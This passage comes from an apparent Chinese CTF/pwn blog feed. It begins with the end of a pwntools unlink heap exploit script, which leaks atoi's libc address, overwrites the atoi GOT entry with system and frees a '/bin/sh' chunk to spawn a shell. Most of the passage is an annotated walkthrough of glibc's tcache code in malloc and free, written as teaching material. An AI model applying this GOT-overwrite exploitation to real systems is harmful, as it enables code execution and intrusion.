class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tcache机制</title>
    <link href="https://nocbtm.github.io/2020/02/27/tcache%E6%9C%BA%E5%88%B6/"/>
    <id>https://nocbtm.github.io/2020/02/27/tcache机制/</id>
    <published>2020-02-27T03:36:21.000Z</published>
    <updated>2020-04-09T13:15:24.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p><p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p><h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; 